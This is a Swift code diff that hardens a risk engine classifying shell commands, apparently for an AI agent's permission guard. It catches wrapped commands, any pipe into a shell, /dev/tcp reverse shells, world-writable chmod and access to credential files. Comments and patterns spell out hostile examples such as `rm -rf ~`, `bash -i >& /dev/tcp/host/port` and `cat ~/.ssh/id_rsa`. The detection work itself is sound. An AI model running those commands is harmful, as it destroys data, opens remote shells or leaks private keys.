@@ -65,10 +65,16 @@ public enum RiskEngine {
     private static func commandLeaders(_ cmd: String) -> Set<String> {
         var result: Set<String> = []
         for seg in cmd.split(whereSeparator: { ";&|\n`()".contains($0) }) {
+            var passedWrapper = false
             for tok in seg.split(whereSeparator: { $0 == " " || $0 == "\t" }).map(String.init) {
                 if tok.range(of: #"^\w+=.*"#, options: .regularExpression) != nil { continue }  // env assignment
+                if wrappers.contains(tok) { result.insert(tok); passedWrapper = true; continue }
+                // A wrapper's OWN args (a flag, a numeric duration like `timeout 5`, a flag=val)
+                // must be skipped so the real command after them is still detected — e.g.
+                // `timeout 5 rm -rf ~` or `nice -n 10 rm …` would otherwise stop at "5"/"-n".
+                if passedWrapper, tok.hasPrefix("-") || tok.range(of: #"^\d+$"#, options: .regularExpression) != nil { continue }
                 result.insert(tok)
-                if !wrappers.contains(tok) { break }   // reached the real command
+                break   // reached the real command
             }
         }
         return result
@@ -136,9 +142,11 @@ public enum RiskEngine {
         let cmd = raw.lowercased()
         let leaders = commandLeaders(cmd)
 
-        // Pipe-to-shell — the classic remote-exec footgun.
-        if (cmd.contains("curl ") || cmd.contains("wget ")) && (cmd.contains("| sh") || cmd.contains("|sh") || cmd.contains("| bash") || cmd.contains("|bash")) {
-            return red("pipes a download into a shell", always: true)
+        // Pipe-to-shell — the classic remote-exec footgun. ANY pipe into a shell executes
+        // arbitrary fetched/decoded/generated code (curl|sh, base64 -d|sh, echo …|bash), not
+        // just curl/wget, so flag the pipe-into-a-shell itself.
+        if cmd.range(of: #"\|\s*(sh|bash|zsh|dash|ksh)\b"#, options: .regularExpression) != nil {
+            return red("pipes into a shell", always: true)
         }
         // Fork bomb / disk wipe.
         if cmd.contains(":(){") { return red("fork bomb", always: true) }
@@ -212,6 +220,21 @@ public enum RiskEngine {
             || cmd.range(of: #"\b(chmod|chown)\b.*\s/(etc|usr|bin|sbin|system)"#, options: .regularExpression) != nil {
             return red("touches a system path")
         }
+        // Reverse shell via bash's network pseudo-device (e.g. `bash -i >& /dev/tcp/host/port`).
+        if cmd.contains("/dev/tcp/") || cmd.contains("/dev/udp/") {
+            return red("opens a network socket (reverse shell)", always: true)
+        }
+        // World-writable / setuid permission change (777, a+w, o+w, +s) — privilege/persistence risk.
+        if cmd.contains("chmod"), cmd.range(of: #"(777|\+s|a\+w|o\+w)"#, options: .regularExpression) != nil {
+            return red("makes a file world-writable / setuid", always: true)
+        }
+        // Credential / persistence files (read OR write, via any utility or redirect) — checked
+        // BEFORE the amber redirect/move rules so `echo x >> ~/.bashrc` isn't downgraded to .write
+        // and auto-allowed in Autonomous. assessFile only guards the first-party File tools, so a
+        // raw Bash `cat ~/.ssh/id_rsa` would otherwise fall through to .read. cmd is lowercased.
+        if Self.touchesSensitivePath(cmd) {
+            return red("touches a credential/persistence file", always: true)
+        }
         // Process control / shutdown.
         if cmd.contains("killall") || cmd.contains("pkill") || cmd.range(of: #"(^|\s)kill\s+-9"#, options: .regularExpression) != nil {
             return red("kills processes")
@@ -246,13 +269,6 @@ public enum RiskEngine {
         // Mutating git / file moves.
         if cmd.contains("git commit") || cmd.contains("git merge") || cmd.contains("git rebase") || cmd.contains("mv ") || cmd.contains("> ") {
             return amber("modifies files / history")
-        }
-        // Credential / persistence files are exfiltration (read) or persistence (write) no
-        // matter which shell utility touches them (cat/cp/base64/…) — assessFile only guards
-        // the first-party File tools, so without this a Bash `cat ~/.ssh/id_rsa` would fall
-        // through to .read and be silently auto-allowed, bypassing the Guardian. cmd is lowercased.
-        if Self.touchesSensitivePath(cmd) {
-            return red("touches a credential/persistence file", always: true)
         }
         return RiskAssessment(level: .read, reason: "safe command", alwaysDangerous: false)
     }
